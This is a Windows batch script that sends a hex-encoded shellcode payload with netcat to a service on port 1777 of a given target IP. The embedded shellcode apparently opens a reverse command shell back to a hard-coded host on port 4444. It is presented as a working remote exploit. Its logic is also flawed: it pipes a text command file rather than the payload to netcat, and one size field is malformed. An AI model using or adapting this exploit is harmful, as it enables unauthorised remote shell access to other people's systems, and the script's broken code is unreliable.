@echo off
setlocal

REM Check if IP address is provided
if "%~1"=="" (
    echo Usage: %0 ^<target_ip^>
    exit /b 1
)

set TARGET_IP=%~1
set PORT=1777

REM Create payload
set PAYLOAD=fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8561e680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5

REM Prepare the message structure
set HEADER=03 00 00 00
set HEADER_SIZE=05 00 00 00
set PAYLOAD_SIZE=800 00 00 00

REM Craft the complete payload message
set MSG=%HEADER% %HEADER_SIZE% %PAYLOAD_SIZE% %PAYLOAD%

REM Convert the hex string to binary format
echo %MSG% | xxd -r -p > payload.bin

REM Send the crafted payload to the target
(
    echo open %TARGET_IP% %PORT%
    echo send payload.bin
    echo quit
) > command.txt

REM Execute netcat to send the payload
nc -w 2 -v %TARGET_IP% %PORT% < command.txt

REM Cleanup
del command.txt payload.bin
endlocal